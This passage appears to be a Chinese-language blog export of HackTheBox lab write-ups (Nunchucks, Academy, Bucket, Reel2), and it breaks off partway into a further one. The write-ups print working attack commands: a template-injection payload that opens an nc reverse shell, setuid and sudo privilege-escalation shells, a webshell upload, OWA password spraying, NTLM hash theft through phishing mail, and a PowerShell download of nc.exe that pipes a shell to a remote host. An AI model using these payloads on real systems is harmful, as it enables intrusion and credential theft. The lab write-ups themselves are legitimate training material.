Enginehttp://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine shell1&#123;&#123;range.constructor(\\&quot;return global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 10.10.14.6 4444 &gt;&#x2F;tmp&#x2F;f&#39;)\\&quot;)()&#125;&#125; user flagDavid用户目录，user.txt: ssh写公钥方便后续操作： 123mkdir .sshecho &lt;id_rsa.pub&gt; &gt; ~/.ssh/authorized_keysssh david@nunchucks.htb 提权信息linpeas之类可以发现perl设置有cap_setuid： 但并不能直接使用gtfobins方法得到root： 使用apparmor对perl作了限制 /etc/apparmor.d/usr.bin.perl1234567891011121314151617181920212223# Last Modified: Tue Aug 31 18:25:30 2021#include &lt;tunables&#x2F;global&gt;&#x2F;usr&#x2F;bin&#x2F;perl &#123; #include &lt;abstractions&#x2F;base&gt; #include &lt;abstractions&#x2F;nameservice&gt; #include &lt;abstractions&#x2F;perl&gt; capability setuid, deny owner &#x2F;etc&#x2F;nsswitch.conf r, deny &#x2F;root&#x2F;* rwx, deny &#x2F;etc&#x2F;shadow rwx, &#x2F;usr&#x2F;bin&#x2F;id mrix, &#x2F;usr&#x2F;bin&#x2F;ls mrix, &#x2F;usr&#x2F;bin&#x2F;cat mrix, &#x2F;usr&#x2F;bin&#x2F;whoami mrix, &#x2F;opt&#x2F;backup.pl mrix, owner &#x2F;home&#x2F; r, owner &#x2F;home&#x2F;david&#x2F; r,&#125; 提权 &amp; root flag很简单的方式，perl运行pl文件会受到限制，但通过SheBang调用perl时，不会受到限制： Bug #1911431 “Unable to prevent execution of shebang lines” : Bugs : AppArmorhttps://bugs.launchpad.net/apparmor/+bug/1911431 shell.pl123456#!/usr/bin/perluse POSIX qw(strftime);use POSIX qw(setuid);POSIX::setuid(0);exec \"/bin/sh\" 参考资料 Template Engineshttps://expressjs.com/en/resources/template-engines.html mozilla/nunjucks: A powerful templating engine with inheritance, asynchronous control, and more (jinja2 inspired)https://github.com/mozilla/nunjucks Sandbox Breakout - A View of the Nunjucks Template Enginehttp://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine perl | GTFOBinshttps://gtfobins.github.io/gtfobins/perl/#capabilities Bug #1911431 “Unable to prevent execution of shebang lines” : Bugs : AppArmorhttps://bugs.launchpad.net/apparmor/+bug/1911431 https://www.hackthebox.com/home/machines/writeup/414 HTB: Nunchucks | 0xdf hacks stuffhttps://0xdf.gitlab.io/2021/11/02/htb-nunchucks.html","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Academy - HackTheBox","slug":"Academy-HackTheBox","date":"2020-11-09T07:50:57.000Z","updated":"2021-03-01T00:45:08.648Z","comments":true,"path":"2020/11/09/Academy-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/11/09/Academy-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/297 10.10.10.215 端口扫描常规的22和80: 12345678910111213141516171819$ nmap -sC -sV -Pn 10.10.10.215Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-09 14:15 CSTNmap scan report for 10.10.10.215Host is up (0.072s latency).Not shown: 998 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 3072 c0:90:a3:d8:35:25:6f:fa:33:06:cf:80:13:a0:a5:53 (RSA)| 256 2a:d5:4b:d0:46:f0:ed:c9:3c:8d:f6:5d:ab:ae:77:96 (ECDSA)|_ 256 e1:64:14:c3:cc:51:b2:3b:a6:28:a7:b1:ae:5f:45:35 (ED25519)80/tcp open http Apache httpd 2.4.41 ((Ubuntu))|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: Did not follow redirect to http://academy.htb/Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 12.03 seconds 80需要加下hosts： 110.10.10.215 academy.htb 普通的注册登录： 就是HTB新出了Academy，所以这周的靶机也是这个： Dashboardhttps://academy.hackthebox.eu/dashboard admin.php简单扫描发现一个admin.php,需要登录，我们之前注册的账号无法登录: 1234567891011121314151617181920212223➜ Academy gobuster dir -u http://academy.htb/ -w /usr/share/seclists/Discovery/Web-Content/Common-PHP-Filenames.txt -k -t 50===============================================================Gobuster v3.0.1by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)===============================================================[+] Url: http://academy.htb/[+] Threads: 50[+] Wordlist: /usr/share/seclists/Discovery/Web-Content/Common-PHP-Filenames.txt[+] Status codes: 200,204,301,302,307,401,403[+] User Agent: gobuster/3.0.1[+] Timeout: 10s===============================================================2020/10/29 21:22:37 Starting gobuster===============================================================/register.php (Status: 200)/login.php (Status: 200)/home.php (Status: 302)/index.php (Status: 200)/config.php (Status: 200)/admin.php (Status: 200)===============================================================2020/10/29 21:22:49 Finished=============================================================== roleid注意注册请求有个roleid，默认是0，如果改成1，注册的就是管理员用户： 得到一个新域名，同样加hosts后访问: 110.10.10.215 academy.htb dev-staging-01.academy.htb dev-staging-01.academy.htbLaravel给出大量调试信息： 其中有token，搜索能够得到一个可利用漏洞： Laravel 反序列化exp直接打到www-root的shell，注意参数，rhosts是主域名，vhost是子域名： 1python3 -c 'import pty; pty.spawn(\"/bin/bash\")' Laravel .env config因为是Laravel。直接在.env目录得到数据库密码： 123456DB_CONNECTION&#x3D;mysqlDB_HOST&#x3D;127.0.0.1DB_PORT&#x3D;3306DB_DATABASE&#x3D;academyDB_USERNAME&#x3D;devDB_PASSWORD&#x3D;mySup3rP4s5w0rd!! user flag直接查看下有哪些用户，然后cry0l1t3用户可以用这个密码ssh登录，得到user.txt: audit log在audit log中得到mrb3n账号的密码： 提权信息1mrb3n : mrb3n_Ac@d3my! mrb3n账号能以root权限执行composer： 利用方式： composer | GTFOBinshttps://gtfobins.github.io/gtfobins/composer/ root flag直接提到root读取root.txt: 123TF=$(mktemp -d)echo '&#123;\"scripts\":&#123;\"x\":\"/bin/sh -i 0&lt;&amp;3 1&gt;&amp;3 2&gt;&amp;3\"&#125;&#125;' &gt;$TF/composer.jsonsudo composer --working-dir=$TF run-script x 参考资料 Spawning a TTY Shellhttps://netsec.ws/?p=337 composer | GTFOBinshttps://gtfobins.github.io/gtfobins/composer/ Academy - YouTubehttps://www.youtube.com/watch?v=cbX0ACUn_BM&amp;ab_channel=DavidDavies","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Bucket - HackTheBox","slug":"Bucket-HackTheBox","date":"2020-11-03T06:00:23.000Z","updated":"2021-04-25T02:30:38.325Z","comments":true,"path":"2020/11/03/Bucket-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/11/03/Bucket-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/283 10.10.10.212 端口扫描常规22和80: 123456789101112131415161718$ nmap -sC -sV 10.10.10.212Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-03 12:17 CSTNmap scan report for bucket.htb (10.10.10.212)Host is up (0.068s latency).Not shown: 998 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)| 256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)|_ 256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)80/tcp open http Apache httpd 2.4.41|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: Site doesn't have a title (text/html).Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 14.43 seconds 80 bucket.htb直接访问80会跳转到bucket.htb然后出错，加hosts后访问： 源码里得到一个子域名，同样加hosts： s3.bucket.htb直接访问显示status，扫描目录后访问shell知道这是AWS相关服务： 1234➜ Bucket gobuster dir -u http://s3.bucket.htb -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -k -t 50/health (Status: 200)/shell (Status: 200) AWSawscli直接用awscli，参考官方文档操作： 12345678910# install awsclisudo apt-get install awscli# configure aws # key直接空着也可以aws configureAWS Access Key ID [None]: AKIAIOSFODNN7EXAMPLEAWS Secret Access Key [None]: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEYDefault region name [None]: us-west-2Default output format [None]: json list bucket123➜ Bucket aws s3 ls --endpoint-url http://s3.bucket.htb --no-sign-request2020-11-03 00:05:04 adserver webshell直接写webshell： 1aws s3 cp shell.php s3://adserver/shell.php --endpoint-url http://s3.bucket.htb --no-sign-request 查看home目录得到用户名： tables根据shell目录信息显示是dynamodb，可以查看table信息,得到一些用户名密码，其中Sysadm的密码就是上面得到的roy用户密码： 12345678910111213141516171819202122232425262728293031323334353637383940414243➜ Bucket aws dynamodb list-tables --endpoint-url http://s3.bucket.htb/ --no-sign-request&#123; \"TableNames\": [ \"Image\", \"ImageTag\", \"users\" ]&#125;➜ Bucket aws dynamodb scan --table-name users --endpoint-url http://s3.bucket.htb/ --no-sign-request&#123; \"Items\": [ &#123; \"password\": &#123; \"S\": \"Management@#1@#\" &#125;, \"username\": &#123; \"S\": \"Mgmt\" &#125; &#125;, &#123; \"password\": &#123; \"S\": \"Welcome123!\" &#125;, \"username\": &#123; \"S\": \"Cloudadm\" &#125; &#125;, &#123; \"password\": &#123; \"S\": \"n2vM-&lt;_K_Q:.Aa2\" &#125;, \"username\": &#123; \"S\": \"Sysadm\" &#125; &#125; ], \"Count\": 3, \"ScannedCount\": 3, \"ConsumedCapacity\": null&#125;➜ Bucket user flag直接ssh登录roy用户，得到user.txt: 1roy : n2vM-&lt;_K_Q:.Aa2 提权信息简单查看一些文件代码，可以知道本地开了8000端口是web service，4566是aws service： 并且根据代码，可以知道web会从aws获取数据渲染成pdf： 1234567891011121314151617181920212223242526if($_SERVER[\"REQUEST_METHOD\"]===\"POST\") &#123; if($_POST[\"action\"]===\"get_alerts\") &#123; date_default_timezone_set('America/New_York'); $client = new DynamoDbClient([ 'profile' =&gt; 'default', 'region' =&gt; 'us-east-1', 'version' =&gt; 'latest', 'endpoint' =&gt; 'http://localhost:4566' ]); $iterator = $client-&gt;getIterator('Scan', array( 'TableName' =&gt; 'alerts', 'FilterExpression' =&gt; \"title = :title\", 'ExpressionAttributeValues' =&gt; array(\":title\"=&gt;array(\"S\"=&gt;\"Ransomware\")), )); foreach ($iterator as $item) &#123; $name=rand(1,10000).'.html'; file_put_contents('files/'.$name,$item[\"data\"]); &#125; passthru(\"java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/$name 800 A4 -out files/result.pdf\"); &#125;&#125;else&#123;?&gt; 那么我们可以考虑通过aws将root.txt写到dynamodb table里，然后通过web service渲染成pdf，从外部进行查看 80008000端口转发出去方便访问： 1ssh -L 8000:localhost:8000 roy@10.10.10.212 提权12345678# 创建一个新dynamodb table/usr/bin/aws dynamodb create-table --table-name alerts --attribute-definitions AttributeName=title,AttributeType=S --key-schema AttributeName=title,KeyType=HASH --provisioned-throughput ReadCapacityUnits=10,WriteCapacityUnits=5 --endpoint-url http://127.0.0.1:4566# 将root.txt作为附件写进去/usr/bin/aws dynamodb put-item --table-name alerts --item '&#123;\"title\": &#123;\"S\": \"Ransomware\"&#125;, \"data\": &#123;\"S\": \"&lt;pd4ml:attachment description=\\\"attached.txt\\\" icon=\\\"PushPin\\\"&gt;file:///root/root.txt&lt;/pd4ml:attachment&gt;\"&#125;&#125;' --endpoint-url http://127.0.0.1:4566# 触发渲染curl -X POST -d \"action=get_alerts\" http://127.0.0.1:8000/ -v files 渲染成的pdf在files目录下，pdf中附件txt就是root.txt: root flag 直接查看pdf中的附件，得到root.txt: 参考资料 AWS Command Line Interface 是什么？ - AWS Command Line Interfacehttps://docs.aws.amazon.com/zh_cn/cli/latest/userguide/cli-chap-welcome.html Bucket Commands to root | RaidForumshttps://raidforums.com/Thread-Free-Flag-Bucket-Commands-to-root?highlight=htb+bucket","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Reel2 - HackTheBox","slug":"Reel2-HackTheBox","date":"2020-11-03T00:46:56.000Z","updated":"2021-03-15T00:32:37.649Z","comments":true,"path":"2020/11/03/Reel2-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/11/03/Reel2-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/281 10.10.10.210 端口扫描1234567891011121314151617181920212223242526272829303132333435363738$ nmap -sC -sV 10.10.10.210Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-02 13:18 CSTNmap scan report for 10.10.10.210Host is up (0.069s latency).Not shown: 991 filtered portsPORT STATE SERVICE VERSION80/tcp open http Microsoft IIS httpd 8.5|_http-server-header: Microsoft-IIS/8.5|_http-title: 403 - Forbidden: Access is denied.443/tcp open ssl/http Microsoft IIS httpd 8.5| http-methods:|_ Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/8.5|_http-title: IIS Windows Server| ssl-cert: Subject: commonName=Reel2| Subject Alternative Name: DNS:Reel2, DNS:Reel2.htb.local| Not valid before: 2020-07-30T10:12:46|_Not valid after: 2025-07-30T10:12:46|_ssl-date: 2020-11-02T05:20:05+00:00; 0s from scanner time.6001/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.06002/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.06004/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.06005/tcp open msrpc Microsoft Windows RPC6006/tcp open msrpc Microsoft Windows RPC6007/tcp open msrpc Microsoft Windows RPC8080/tcp open http Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.2.32)| http-cookie-flags:| /:| PHPSESSID:|_ httponly flag not set| http-open-proxy: Potentially OPEN proxy.|_Methods supported:CONNECTION|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.2.32|_http-title: Welcome | WallstantService Info: OS: Windows; CPE: cpe:/o:microsoft:windowsService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 78.46 seconds 8080访问是403: 443443直接访问是IIS默认页面： 80808080随意注册登录进去，里面有一些用户名可以提取出来作为用户名字典,并且处理一下不同格式： usernamesnames.txt123456cube cubecube0x0 cube0x0sven svenssonlars larssonjenny adamsteresa trump UserName.py123456789101112131415161718192021222324252627282930313233343536#!/usr/bin/env pythonimport sysimport os.pathif __name__ == \"__main__\": if len(sys.argv) != 2: print(\"usage: &#123;&#125; names.txt\".format((sys.argv[0]))) sys.exit(0) if not os.path.exists(sys.argv[1]): print(\"&#123;&#125; not found\".format(sys.argv[1])) sys.exit(0) for line in open(sys.argv[1]): name = ''.join([c for c in line if c == \" \" or c.isalpha()]) tokens = name.lower().split() # skip empty lines if len(tokens) &lt; 1: continue fname = tokens[0] lname = tokens[-1] print(fname + lname) # johndoe print(lname + fname) # doejohn print(fname + \".\" + lname) # john.doe print(lname + \".\" + fname) # doe.john print(lname + fname[0]) # doej print(fname[0] + lname) # jdoe print(lname[0] + fname) # djoe print(fname[0] + \".\" + lname) # j.doe print(lname[0] + \".\" + fname) # d.john print(fname) # john print(lname) # joe usernames123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566cubecubecubecubecube.cubecube.cubecubecccubeccubec.cubec.cubecubecubecubexcubexcubexcubexcubex.cubexcubex.cubexcubexcccubexccubexc.cubexc.cubexcubexcubexsvensvenssonsvenssonsvensven.svenssonsvensson.svensvenssonsssvenssonssvens.svenssons.svensvensvenssonlarslarssonlarssonlarslars.larssonlarsson.larslarssonlllarssonllarsl.larssonl.larslarslarssonjennyadamsadamsjennyjenny.adamsadams.jennyadamsjjadamsajennyj.adamsa.jennyjennyadamsteresatrumptrumpteresateresa.trumptrump.teresatrumptttrumptteresat.trumpt.teresateresatrump 目录扫描因为前面443直接访问是默认页面，直接扫描目录,发现一个owa目录，这是exchange： 1234567gobuster dir -u https://10.10.10.210 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -k -t 50/public (Status: 302)/exchange (Status: 302)/Public (Status: 302)/rpc (Status: 401)/owa (Status: 301) passwords前面8080那里有一句‘This summer is so hot!’，这个其实是密码提示，直接把所有summer密码提取出来作为密码字典： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222➜ Reel2 cat /usr/share/wordlists/rockyou.txt | grep Summer &gt; pass.txt➜ Reel2 cat pass.txtSummerSummer1Summer07Summer08Summer06Summer05Summer01Summer99Summer11Summer2007SummertimeSummer04Summer03Summer2Summer12Summer09Summer!Summer13Summer123SummerlandSummer7Summer69Summer5Summer24Summer22Summer02SummersSummerof69Summer9Summer8Summer4Summer3Summer2009Summer2008Summer2005Summer18Summer00SummersaltSummer_87SummerSunSummerOf69Summer88Summer87Summer86Summer83Summer77Summer73Summer27Summer26Summer25Summer23Summer21Summer2006Summer1975Summer2020Summer16Summer10Summer07!Summer0Summer.Summer#5BuffySummers2SummerSummeryaySummervirgoSummertje26481Summertime@6Summertime321Summertime2Summertime1606Summertime07Summertime06Summertime04Summertime03Summersunset1SummerstarSummerskySummersideSummers25!Summers1Summers08Summers01Summerrain1SummerofLoveSummerof2007Summerof2005Summerocks21SummernightsSummermistSummerlynn24Summerlyn6891Summerlovin25SummerlovinSummerlovenSummerlove16SummerlolSummerlin22Summerlee3Summerland58Summerisover1SummerhillSummerheat12SummerhayesSummergrl18SummerglennSummergirl94Summerg!rl!17Summerfun99Summerfun2006Summerfun2SummerfunSummerfestSummercem1905Summerbjs1Summeraye1Summer_dogSummerRiverSummerOpenSummerNats20SummerNatsSummerMelodySummerMaySummerLuv1SummerLoveSummerJubilee1SummerHillSummerHalliday92SummerGirlSummerG411SummerG1SummerDay18SummerD15SummerBreezeSummerBaySummerB21SummerAngel0805Summer@189Summer@008Summer&gt;&lt;4691Summer;Summer98Summer95Summer93Summer901Summer90Summer7kSummer79Summer78*Summer78Summer701Summer68Summer66Summer64Summer61Summer58Summer57Summer566Summer524Summer5!Summer4meSummer4986Summer4677Summer456Summer45Summer44Summer365Summer34Summer3232Summer2k7Summer2WinterSummer284TimeSummer2425Summer2311Summer2310Summer219Summer2100Summer21*Summer2010Summer2002Summer17Summer150207Summer15Summer14+Summer14Summer1313Summer124#Summer11BlueyesSummer1029Summer101Summer098Summer08,,x*Summer078Summer001!Summer0!Summer.07Summer-leeAlbertSummer-feildSummer-DayzesSummer#69Summer!9Summer!!Summer breaakSpring2SummerShiatsuSummer2007SSummer905LongHotSummerLisaSummersJamienSummerRaeDonnaSummerHeroBabySummerBSummers*4Summer2546Summer21Summer1Summer19Summerlee12Summer0Summertime000Summer(Summertime) 爆破OWA现在我们有用户名密码字典，有OWA，需要做的就是爆破OWA，OWA爆破有专门的工具： https://github.com/byt3bl33d3r/SprayingToolkit (密码是Summer2020，前面的字典可能没有这么新的，自己生成下也可以) 123456789python3 ../tools/SprayingToolkit/atomizer.py owa 10.10.10.210 passwords.txt names.txt -i 0:0:01[*] Trying to find autodiscover URL[+] Using OWA autodiscover URL: https://10.10.10.210/autodiscover/autodiscover.xml[+] OWA domain appears to be hosted internally[+] Got internal domain name using OWA: HTB[*] Starting spray at 2020-11-02 05:52:52 UTC...[+] Found credentials: s.svensson:Summer2020... 登录进去，语言有点坑，需要网页翻译： hash窃取根据已有条件搜索得到利用方式： NetNTLMv2 hash stealing using Outlook - Red Teaming Experimentshttps://www.ired.team/offensive-security/initial-access/netntlmv2-hash-stealing-using-outlook 就是群发钓鱼邮件，开着 Responder监听，得到hash： 还有Responder在mac下有问题，切换到kali虚拟机运行了，并且需要稍微等一会儿，得到hash： 1sudo responder -I tun0 hash crack12345678[HTTP] NTLMv2 Client : 10.10.10.210[HTTP] NTLMv2 Username : htb\\k.svensson[HTTP] NTLMv2 Hash : k.svensson::htb:ec98350342ddsudo hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --force...K.SVENSSON::htb:ec98350342dd9944:eff17420424c1c052103254afcc5a8d9:0101000000000000c6282765e4b0d601100845ef44e2d90e000000000200060053004d0042000100160053004d0042002d0054004f004f004c004b00490054000400120073006d0062002e006c006f00630061006c000300280073006500720076006500720032003000300033002e0073006d0062002e006c006f00630061006c000500120073006d0062002e006c006f00630061006c00080030003000000000000000000000000040000090fd6e60d9736c5278a4a765e1e90d9a046f9acef2b49b66919acbc3ba8e37310a001000000000000000000000000000000000000900200048005400540050002f00310030002e00310030002e00310034002e00310032000000000000000000:kittycat1... 破解出来密码是kittycat1,用户名是k.svensson user flag然后因为服务器没开winrm，所以需要通过powershell去登录： 1234567891011121314apt install gss-ntlmssp # 重要，kali有powershell，但不装这个的话连接报错apt install powershell➜ ~ pwsh... PS /home/miao&gt; $offsec_session = New-PSSession -ComputerName 10.10.10.210 -Authentication Negotiate -Credential k.svenssonPowerShell credential requestEnter your credentials.Password for user k.svensson: *********PS /home/miao&gt; Enter-PSSession $offsec_session[10.10.10.210]: PS&gt; 然后这个powershell连接不能直接用ls,cd之类的，需要一点技巧： powershell - Can you change the behavior of Out-Default for a script? - Stack Overflowhttps://stackoverflow.com/questions/18082746/can-you-change-the-behavior-of-out-default-for-a-script 之后就是去读取user.txt: reverse shell直接反弹个powershell方便后续操作： 123&amp;&#123; iwr -uri http:&#x2F;&#x2F;10.10.14.12:9999&#x2F;nc64.exe -o &#39;C:\\Windows\\System32\\spool\\drivers\\color\\nc.exe&#39;&#125;&amp;&#123; cd &#39;C:\\Windows\\System32\\spool\\drivers\\color\\&#39;&#125;&amp;&#123; .&#x2F;nc.exe 10.10.14.12 4445 -e powershell.exe&#125; 提权信息 前面也看到在用户目录桌面有个Sticky Notes.lnk，跟进去，在”C:\\Users\\k.svensson\\AppData\\Roaming\\stickynotes\\Local Storage\\leveldb&gt;”发现一个log文件，里面有一组账号密码： 12345nc.exe 10.10.14.12 4444 &lt; \"C:\\users\\k.svensson\\appdata\\roaming\\stickynotes\\Local Storage/leveldb\\000003.log\"&#123;\"first\":\"&lt;p&gt;Credentials for JEA&lt;/p&gt;&lt;p&gt;jea_test_account:Ab!Q@vcg^%@#1&lt;/p&gt;\",\"back\":\"rgb(255, 242, 171)\",\"title\":\"rgb(255, 235, 129)\",\"wid\":\"350\",\"hei\":\"375\",\"deleted\":\"no\",\"closed\":\"yes\",\"locked\":\"no\"&#125;jea_test_account:Ab!Q@vcg^%@#1 然后在C:\\Users\\k.svensson\\Documents目录有两个文件, 根据内容我们可以知道这个用户可以获取C:\\ProgramData目录下文件内容，那么我们可以考虑做一个软链接，把Administrator用户目录链接到C:\\ProgramData下 jea_test_account.psrc1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162@&#123;# ID used to uniquely identify this documentGUID = '08c0fdac-36ef-43b5-931f-68171c4c8200'# Author of this documentAuthor = 'cube0x0'# Description of the functionality provided by these settings# Description = ''# Company associated with this documentCompanyName = 'Unknown'# Copyright statement for this documentCopyright = '(c) 2020 cube0x0. All rights reserved.'# Modules to import when applied to a session# ModulesToImport = 'MyCustomModule', @&#123; ModuleName = 'MyCustomModule'; ModuleVersion = '1.0.0.0'; GUID = '4d30d5f0-cb16-4898-812d-f20a6c596bdf' &#125;# Aliases to make visible when applied to a session# VisibleAliases = 'Item1', 'Item2'# Cmdlets to make visible when applied to a session# VisibleCmdlets = 'Invoke-Cmdlet1', @&#123; Name = 'Invoke-Cmdlet2'; Parameters = @&#123; Name = 'Parameter1'; ValidateSet = 'Item1', 'Item2' &#125;, @&#123; Name = 'Parameter2'; ValidatePattern = 'L*' &#125; &#125;# Functions to make visible when applied to a session# VisibleFunctions = 'Invoke-Function1', @&#123; Name = 'Invoke-Function2'; Parameters = @&#123; Name = 'Parameter1'; ValidateSet = 'Item1', 'Item2' &#125;, @&#123; Name = 'Parameter2'; ValidatePattern = 'L*' &#125; &#125;# External commands (scripts and applications) to make visible when applied to a session# VisibleExternalCommands = 'Item1', 'Item2'# Providers to make visible when applied to a session# VisibleProviders = 'Item1', 'Item2'# Scripts to run when applied to a session# ScriptsToProcess = 'C:\\ConfigData\\InitScript1.ps1', 'C:\\ConfigData\\InitScript2.ps1'# Aliases to be defined when applied to a session# AliasDefinitions = @&#123; Name = 'Alias1'; Value = 'Invoke-Alias1'&#125;, @&#123; Name = 'Alias2'; Value = 'Invoke-Alias2'&#125;# Functions to define when applied to a sessionFunctionDefinitions = @&#123; 'Name' = 'Check-File' 'ScriptBlock' = &#123;param($Path,$ComputerName=$env:COMPUTERNAME) [bool]$Check=$Path -like \"D:\\*\" -or $Path -like \"C:\\ProgramData\\*\" ; if($check) &#123;get-content $Path&#125;&#125; &#125;# Variables to define when applied to a session# VariableDefinitions = @&#123; Name = 'Variable1'; Value = &#123; 'Dynamic' + 'InitialValue' &#125; &#125;, @&#123; Name = 'Variable2'; Value = 'StaticInitialValue' &#125;# Environment variables to define when applied to a session# EnvironmentVariables = @&#123; Variable1 = 'Value1'; Variable2 = 'Value2' &#125;# Type files (.ps1xml) to load when applied to a session# TypesToProcess = 'C:\\ConfigData\\MyTypes.ps1xml', 'C:\\ConfigData\\OtherTypes.ps1xml'# Format files (.ps1xml) to load when applied to a session# FormatsToProcess = 'C:\\ConfigData\\MyFormats.ps1xml', 'C:\\ConfigData\\OtherFormats.ps1xml'# Assemblies to load when applied to a session# AssembliesToLoad = 'System.Web', 'System.OtherAssembly, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'&#125; jea_test_account.pssc1234567891011121314151617181920212223242526272829303132333435@&#123;# Version number of the schema used for this documentSchemaVersion = '2.0.0.0'# ID used to uniquely identify this documentGUID = 'd6a39756-aa53-4ef6-a74b-37c6a80fd796'# Author of this documentAuthor = 'cube0x0'# Description of the functionality provided by these settings# Description = ''# Session type defaults to apply for this session configuration. Can be 'RestrictedRemoteServer' (recommended), 'Empty', or 'Default'SessionType = 'RestrictedRemoteServer'# Directory to place session transcripts for this session configuration# TranscriptDirectory = 'C:\\Transcripts\\'# Whether to run this session configuration as the machine's (virtual) administrator accountRunAsVirtualAccount = $true# Scripts to run when applied to a session# ScriptsToProcess = 'C:\\ConfigData\\InitScript1.ps1', 'C:\\ConfigData\\InitScript2.ps1'# User roles (security groups), and the role capabilities that should be applied to them when applied to a sessionRoleDefinitions = @&#123; 'htb\\jea_test_account' = @&#123; 'RoleCapabilities' = 'jea_test_account' &#125; &#125;# Language mode to apply when applied to a session. Can be 'NoLanguage' (recommended), 'RestrictedLanguage', 'ConstrainedLanguage', or 'FullLanguage'LanguageMode = 'NoLanguage'&#125; 提权直接软链接，然后jea_test_account去读取root.txt: 12345678910# target powershellNew-Item -ItemType Junction -Path 'C:\\ProgramData\\miao' -Target 'C:\\Users\\Administrator'# local pwshPS /home/miao&gt; $username = \"jea_test_account\"PS /home/miao&gt; $password = ConvertTo-SecureString \"Ab!Q@vcg^%@#1\" -AsPlainText -ForcePS /home/miao&gt; $cred = New-Object System.Management.Automation.PSCredential -ArgumentList ($username, $password)PS /home/miao&gt; Enter-PSSession -Computer 10.10.10.210 -credential $cred -ConfigurationName jea_test_account -verbose -debug -Authentication Negotiate[10.10.10.210]: PS&gt;Check-File C:\\programdata\\miao\\Desktop\\root.txt5914fa1b443305f23ba79db43a27e5dd 参考资料 UserName.py - Pastebin.comhttps://pastebin.com/QXrDwkW2 https://github.com/byt3bl33d3r/SprayingToolkit NetNTLMv2 hash stealing using Outlook - Red Teaming Experimentshttps://www.ired.team/offensive-security/initial-access/netntlmv2-hash-stealing-using-outlook powershell - Can you change the behavior of Out-Default for a script? - Stack Overflowhttps://stackoverflow.com/questions/18082746/can-you-change-the-behavior-of-out-default-for-a-script Hack-The-Box-walkthrough[reel2] | lUc1f3r11’s bloghttps://fdlucifer.github.io/2020/10/13/reel2/ Reel2 Detailed Writeup | RaidForumshttps://raidforums.com/Thread-Tutorial-Reel2-Detailed-Writeup","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Doctor - HackTheBox","slug":"Doctor-HackTheBox","date":"2020-10-30T06:32:04.000Z","updated":"2021-02-07T00:38:02.926Z","comments":true,"path":"2020/10/30/Doctor-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/10/30/Doctor-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/278 10.10.10.209 端口扫描22,80,8089 1234567891011121314151617181920212223242526$ nmap -sC -sV 10.10.10.209Starting Nmap 7.91 ( https://nmap.org ) at 2020-10-30 13:25 CSTNmap scan report for 10.10.10.209Host is up (0.069s latency).Not shown: 997 filtered 